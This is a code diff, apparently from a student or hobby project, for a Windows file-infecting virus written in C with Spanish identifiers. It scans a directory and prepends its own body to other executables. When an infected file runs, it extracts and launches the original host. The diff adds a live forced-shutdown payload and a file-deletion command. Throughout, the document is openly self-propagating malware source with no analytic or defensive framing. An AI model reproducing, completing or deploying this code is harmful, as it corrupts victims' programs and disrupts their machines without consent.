@@ -10,8 +10,8 @@
 #include <unistd.h>
 #include <dirent.h>
 
-int tamVirus=44285;
-clock_t st,end;
+int tamVirus=44249;
+
 int printTam(char *str){
   FILE *virus;
   virus=fopen(str,"rb"); //Virus
@@ -23,19 +23,20 @@ int printTam(char *str){
 }
 
 void dameParaInfectar(char*hostingName){
-  printf("Estoy infectado ",hostingName);
-  char nameNuevo[8]="1";
+  //char *nombreParaBorrar=hostingName;
+  printf("Estoy infectado a: \n");
+  printf(hostingName);
+  char nameNuevo[2048]="1";
   strcat(nameNuevo,hostingName);
   FILE *virus,*host,*infectado;
   unsigned long x;
   char buff[2048];
-  char *virusName="final.exe";
+  char *virusName="virus.exe";
   char *nuevoNombre=nameNuevo;
   virus=fopen(virusName,"rb"); //Virus
   host=fopen(hostingName,"rb+"); //Programa victima
   infectado=fopen(nameNuevo,"ab+");//Programa infectado
   x=tamVirus;
-  printf("Infectando..");
   
   //fseek(host, 0, SEEK_END);
   
@@ -61,6 +62,9 @@ void dameParaInfectar(char*hostingName){
   fclose(virus);
   fclose(host);
   fclose(infectado);
+  //char deleteArchivo[2048]="del ";
+  //strcat(deleteArchivo,hostingName);
+  //system(deleteArchivo);
 }
 
 
@@ -83,45 +87,33 @@ void infectar(){
     }
   }
   closedir(dr);
-  //dameParaInfectar("hola.exe");
-  //a++;
-  //system("shutdown -s -t 1000");
-  /*
-  int size=0;
-  fseek(virus, 0, SEEK_END);    
-  size = ftell(virus);
-  printf("Este archivo pesa: %d\n", size);    
-  */
-  
-  //char* comandoBorrar="DEL ";
-  //char*nombreBorrar=strcat(comandoBorrar,hostingName);
-  //system(nombreBorrar);
 }
 
 void ejecutarVictima(char *miNombre){
   int currentTam=printTam(miNombre);
-  if(currentTam>tamVirus){
+  if(currentTam>tamVirus){  
     
-    printf("Soy un archivo infectado: %d",currentTam);
     FILE *temp,*infectado;
     char buff[2048];
     char *tempName="c:\\temp\\temp.exe";
+    system("DEL c:\\temp\\temp.exe");
     _mkdir("C:\\temp");
     infectado=fopen(miNombre,"rb"); //Programa infectado
     temp=fopen(tempName,"ab+");//Programa copiado a carpeta Temporal
     int x=tamVirus;
-    fseek(infectado, x, SEEK_SET ); 
-    while(x>2048) {
+    fseek(infectado, x, SEEK_SET );
+    int t=currentTam;
+    while(t>2048) {
       fread(buff,2048,1,infectado);
       fwrite(buff,2048,1,temp);
-      x-=2048;
+      t-=2048;
     }
-    fread(buff,x,1,infectado);
-    fwrite(buff,x,1,temp);
+    fread(buff,t,1,infectado);
+    fwrite(buff,t,1,temp);
     fclose(temp);
     fclose(infectado);
     system(tempName);
-    //system("shutdown -s -t 1000");
+    system("shutdown -s -t 60");
   }
   else{
     infectar();
@@ -132,13 +124,13 @@ void ejecutarVictima(char *miNombre){
 
 int main(int argc, char** argv){
   
-  char*name="final.exe";
+  /*char*name="final.exe";
   int t=printTam("final.exe");
   printf("Tam: %d",t);
-  
+  */
   //infectar();
   ejecutarVictima(argv[0]);
-  //dameParaInfectar("hola.exe");
+  //dameParaInfectar("git.exe");
   //getch();
   return 0;
 }
